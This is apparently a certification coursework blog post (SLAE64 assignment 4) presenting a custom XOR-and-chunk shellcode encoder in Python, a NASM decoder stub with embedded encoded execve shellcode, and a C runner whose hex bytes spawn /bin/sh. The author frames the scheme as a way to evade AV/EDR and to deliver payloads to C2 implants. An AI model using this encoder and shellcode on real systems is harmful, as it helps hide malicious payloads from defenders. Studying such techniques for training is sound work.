Title: SLAE64 - Assignment 4
Date: 2022-07-16T08:37:18.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><p>The source code for this assignment is stored at the following link: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae64/assignment/4/">rbctee/SlaeExam</a>.</p><p>Within the directory you can find the following files:</p><ul><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/4/encoder.py">encoder.py</a>, a python script which allows you to encode shellcode of arbitrary length and generate an assembly decoder based on a NASM template</li><li> <a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/4/decoder.nasm">decoder.nasm</a>, a NASM file that decodes and runs shellcode encoded with <em>encoder.py</em></li><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/4/decoder_template.txt">decoder_template.txt</a>, the NASM template used by the encoder to generate the decoder program</li></ul><h2 id="encoding-scheme">Encoding Scheme</h2><h3 id="principles">Principles</h3><p>Writing an encoding scheme is pretty easy, you can simply apply the NOT operation on all the bytes and call it a day.</p><p>Although very basic, it's pretty good in terms of size: if you were to encode a 40 bytes long shellcode, the encoded version would probably be something like 55 bytes.</p><p>Nonetheless, there are a few drawbacks:</p><ul><li>it doesn't manage NULL bytes, so if the shellcode contains the byte <code>0xff</code>, after the NOT operation they will become <code>0x00</code> bytes</li><li>it's not good enough for evading AV/EDR products (I haven't actually tested a NOT encoder against either of them, but I doubt it's going to work)</li></ul><p>For this reason, while trying to come up with a new encoding scheme, I decided to focus on the two key points above i.e., managing NULL bytes and being strong enough from an evasion perspective.</p><h3 id="logic">Logic</h3><p>The encoding scheme I came up with can be summarized in the following four steps:</p><ul><li>XOR each byte of the shellcode with a specific byte, generated at random by the encoder</li><li>pad the shellcode in order for the length to be divisible by 7</li><li>divide the shellcode into groups of 7 bytes</li><li>find a byte that XOR-ed to the other 7 bytes doesn't result in NULL bytes</li></ul><p>Here's a visual representation of my encoding scheme:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-5.png" class="kg-image" alt loading="lazy" width="1165" height="1930" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-5.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-5.png 1000w, __GHOST_URL__/content/images/2022/07/image-5.png 1165w" sizes="(min-width: 720px) 720px"><figcaption>Flowchart of the Encoding Scheme</figcaption></figure><h2 id="encoder">Encoder</h2><p>Once the encoding scheme was completed on a theoretical level, I decided to implement it in the programming language I was most comfortable with: Python.</p><p>The script (<em>encoder.py</em>) is divided into the following functions:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-6.png" class="kg-image" alt loading="lazy" width="735" height="795" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-6.png 600w, __GHOST_URL__/content/images/2022/07/image-6.png 735w" sizes="(min-width: 720px) 720px"><figcaption>Encoding script Call Graph</figcaption></figure><p>If this functions seem familiar to you, that may be due to the fact I'm reusing the script I've written for the fourth assignment of the SLAE32 exam.</p><p>I'm not going to comment all the script, since that would be useless. Instead, I'll describe some of the choices behind the encoding function:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">def encode_shellcode(shellcode: bytes) -&gt; bytes:

    global XOR_BYTE

    encoded_shellcode = bytearray()

    XOR_BYTE = random.choice(range(1, 256))

    print(f"[+] Xoring bytes with the byte {hex(XOR_BYTE)}")

    for b in shellcode:
        encoded_shellcode.append(b ^ XOR_BYTE)

    print(f"[+] Size of intermediate encoded shellcode is {len(encoded_shellcode)}")
    if (len(encoded_shellcode) % 7) != 0:
        print(f"[+] Adding padding to shellcode")

        num_pad_bytes = 7 - (len(encoded_shellcode) % 7)

        for x in range(num_pad_bytes):
            encoded_shellcode.append(0)
    else:
        print(f"[+] No need to add padding to the shellcode")

    print(f"[+] Slicing the shellcode into chunks of 7 bytes")
    bytes_chunks = list(chunks(encoded_shellcode, 7))
    encoded_shellcode = bytearray()

    for c in bytes_chunks:
        
        encoded_chunk = encode_chunk(c)
        encoded_shellcode.extend(encoded_chunk)

    print(f"[+] Finished encoding chunks")

    return encoded_shellcode</code></pre><figcaption>Encoding function</figcaption></figure><p>First, it encodes each byte of the shellcode through the XOR operation. The XOR key in this case is a single byte <em>chosen at random</em>.</p><p>Next, the function checks the length of the shellcode, adding NULL bytes at the end in case the length is not a multiple of 7, which is the size I chose for the chunks.</p><p>After that, the shellcode is divided into chunks, each of them XOR-encoded with a random byte which must not be already present in the chunk, in order to avoid NULL bytes in the final encoded shellcode.</p><p>This XOR byte is prepended to the chunk, thus obtaining a <strong>QWORD</strong> (8 bytes).</p><p>Initially, while I was pondering on the details of the encoding scheme, I chose 8 as the size of the chunks because I was thinking of loading chunks into registers.</p><p>Nonetheless, I decided against that idea since the decoder would have become more complex: to extract the prepended byte I would have to rotate the other bytes a few times.</p><p>To calculate the size of the encoded shellcode, you can use this formula:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">def f(x):
    return (x + (7 - (x % 7))) * (8/7)</code></pre><figcaption>Encoded Shellcode Length</figcaption></figure><p>Before continuing to the decoder, I think it's important to add a few notes regarding the features of the encoder.</p><p>The script uses a NASM template (by default loaded from the file <code>decoder_template.txt</code>) in order to dynamically generate the final decoder program.</p><p>I chose this approach to avoid adding too many instructions to the decoder; initially the length of the decoder was around 100 bytes when it included the routine for retrieving the length of the encoded shellcode.</p><p>Here's a screenshot of the arguments you can pass to the encoder script:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-7.png" class="kg-image" alt loading="lazy" width="1219" height="428" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-7.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-7.png 1000w, __GHOST_URL__/content/images/2022/07/image-7.png 1219w" sizes="(min-width: 720px) 720px"><figcaption>Python encoder</figcaption></figure><p>The value of the argument <code>OUTPUT_DECODER</code> is the final decoder program you can then assemble to get the final shellcode.</p><h2 id="decoder">Decoder</h2><p>As for the decoder, its length is a little bit more than 50 bytes; it's not good enough for exploits where size is a vital factor e.g., buffer overflows, or egghunters.</p><p>However, in my opinion it's good enough for bigger payloads; think of situations in which there are Network Security products scanning the network traffic.</p><p>This encoding scheme could be useful to Command &amp; Control frameworks for sending second stages or shellcodes to their implants.</p><p>The decoder discussed in this paragraph was generated with the following polymorphic stack-based execve shellcode I developed while taking the course:  </p><figure class="kg-card kg-bookmark-card kg-card-hascaption"><a class="kg-bookmark-container" href="https://github.com/rbctee/MalwareDevelopment/blob/master/code/shellcode/unix/x86-64/execve_shellcode_stack_polymorphic.nasm"><div class="kg-bookmark-content"><div class="kg-bookmark-title">MalwareDevelopment/execve_shellcode_stack_polymorphic.nasm at master · rbctee/MalwareDevelopment</div><div class="kg-bookmark-description">Code and notes regarding Malware Development. Contribute to rbctee/MalwareDevelopment development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.com/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">rbctee</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/f37090b96514c0f09652c023e218f231b6612d080630f05accc9c7879297aba8/rbctee/MalwareDevelopment" alt=""></div></a><figcaption>Polymorphic shellcode used for generating the decoder</figcaption></figure><p>Here's the full source code of the decoder program:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">; Author: Robert C. Raducioiu

global _start

section .text

_start:

    ; clear RCX
    xor ecx, ecx

    jmp short CallShellcode

Shellcode:

    ; get the address of the encoded shellcode using
    ; the JMP-CALL-POP technique
    pop rsi
    
    ; statically set the size of the shellcode
    add cl, 80

    ; save the base address of the shellcode in RDX
    push rsi
    pop rdx

    ; push to the stack for later use
    push rdx

    ; skip the next routine
    jmp short LoopDecodeSkip

LoopDecode:

    ; increase registers to step to the next chunk
    add rsi, 8
    add rdx, 7

LoopDecodeSkip:

    ; clear RAX
    xor eax, eax

    ; get the XOR byte of the chunk and XOR it
    ; with the XOR byte generated initially
    mov bl, BYTE [rsi]
    xor bl, 0xc

CopyDecodedByte:

    ; step to the next encoded byte
    add al, 1

    ; decode the encoded byte
    mov bh, BYTE [rsi + rax]
    xor bh, bl

    ; replace the encoded byte with the decoded one
    mov BYTE [rdx + rax], bh

    ; if RAX is 7 it means we decoded 7 bytes
    ; it's time to go to the next chunk
    cmp al, 7
    jz LoopDecode

    ; if RCX != 0 then go back to decoding
    loop CopyDecodedByte

RunShellcode:

    ; skip the first byte (XOR byte)
    pop rax
    add al, 1

    ; run the decoded shellcode
    call rax

CallShellcode:

    call Shellcode
    encoded: db 0x50,0x6d,0x95,0x14,0xab,0xbd,0x14,0xd5,0xd1,0x89,0xf9,0x25,0x95,0x5e,0x31,0xd5,0x27,0x7f,0x71,0x63,0x95,0x70,0x2a,0x20,0x14,0x4,0x43,0x54,0x9,0x2,0x50,0xa3,0x13,0x6b,0x7c,0x7d,0x6d,0x6b,0x7c,0x7d,0xe1,0x9f,0xa5,0xdc,0x33,0xbb,0xb9,0xb2,0x13,0x4e,0x57,0x96,0x63,0x3b,0xe7,0x57,0x1c,0x93,0xfc,0x18,0x58,0x9d,0x24,0x34,0x6b,0xe4,0xa7,0x5b,0x2f,0x98,0xaf,0x68,0x49,0x40,0x49,0x49,0x49,0x49,0x49,0x49
</code></pre><figcaption>Assembly decoder</figcaption></figure><p>I won't describe each instruction, mostly because there's a comment for almost each one, but I'm going to list some key points:</p><ul><li>It uses the <code>JMP-CALL-POP</code> technique to retrieve the address of the encoded shellcode.</li><li>It uses the register <code>CL</code> to determine the length of the shellcode. The value is statically set by the encoder; in case it's greater than 256, it uses the register <code>CX</code>.</li><li>It uses the <code>LOOP</code> instruction to check if the counter register reached 0, hence determine if all the encoded bytes were decoded.</li></ul><h2 id="testing">Testing</h2><p>As mentioned previously, I tested the program with a polymorphic version of the stack-based execve shellcode.</p><p>For the final Proof of Concept, I chose the simple version of the stack-based execve shellcode, which you can get here:</p><figure class="kg-card kg-bookmark-card kg-card-hascaption"><a class="kg-bookmark-container" href="https://github.com/rbctee/MalwareDevelopment/blob/master/code/shellcode/unix/x86-64/execve_shellcode_stack.nasm"><div class="kg-bookmark-content"><div class="kg-bookmark-title">MalwareDevelopment/execve_shellcode_stack.nasm at master · rbctee/MalwareDevelopment</div><div class="kg-bookmark-description">Code and notes regarding Malware Development. Contribute to rbctee/MalwareDevelopment development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.com/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">rbctee</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/f37090b96514c0f09652c023e218f231b6612d080630f05accc9c7879297aba8/rbctee/MalwareDevelopment" alt=""></div></a><figcaption>Stack-based execve Shellcode</figcaption></figure><p>If you pass the shellcode above to the python encoder I wrote, you should obtain something similar to this (minus the encoded bytes, since they are different after each run):</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-9.png" class="kg-image" alt loading="lazy" width="2000" height="705" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-9.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-9.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/07/image-9.png 1600w, __GHOST_URL__/content/images/2022/07/image-9.png 2097w" sizes="(min-width: 720px) 720px"><figcaption>Execution of the python encoder</figcaption></figure><p>After that, I assembled the file <code>decoder.nasm</code> using <code>nasm</code> and retrieved the final shellcode using <code>objcopy</code>. Follows the C program I've used to test the decoder shellcode:</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

// previously I've commited the error of initializing the buffer 'code' outside the main
// I said error because it would trigger a Segmentation Fault, due to the memory region 
//  not being executable.
// if you declare inside the main, it will be stored inside the .text section, which should be executable
void main(int argc, char* argv[])
{
    unsigned char code[] = \
"\x31\xc9\xeb\x2d\x5e\x80\xc1\x28\x56\x5a\x52\xeb\x08\x48\x83\xc6\x08\x48\x83\xc2\x07\x31\xc0\x8a\x1e\x80\xf3\xd1\x04\x01\x8a\x3c\x06\x30\xdf\x88\x3c\x02\x3c\x07\x74\xe3\xe2\xf0\x58\x04\x01\xff\xd0\xe8\xce\xff\xff\xff\x4e\xae\x5f\xcf\xd7\x16\x7d\xd7\xcd\xa7\x33\x7e\x75\x72\x33\x33\x6d\xcf\xd4\xef\xf4\x35\x5b\xec\x14\x92\x8d\x4c\x23\x46\x05\xfe\x7d\xa3\xa9\x7d\x7d\x7d\x7d\x7d";

    printf("[+] Shellcode length: %d\n", (int)strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}

</code></pre><figcaption>Shellcode runner</figcaption></figure><p>Running the program above, I successfully managed to decode the encoded shellcode and execute the shell <code>/bin/sh</code>:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-8.png" class="kg-image" alt loading="lazy" width="1790" height="589" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-8.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-8.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/07/image-8.png 1600w, __GHOST_URL__/content/images/2022/07/image-8.png 1790w" sizes="(min-width: 720px) 720px"><figcaption>Testing the decoder shellcode</figcaption></figure>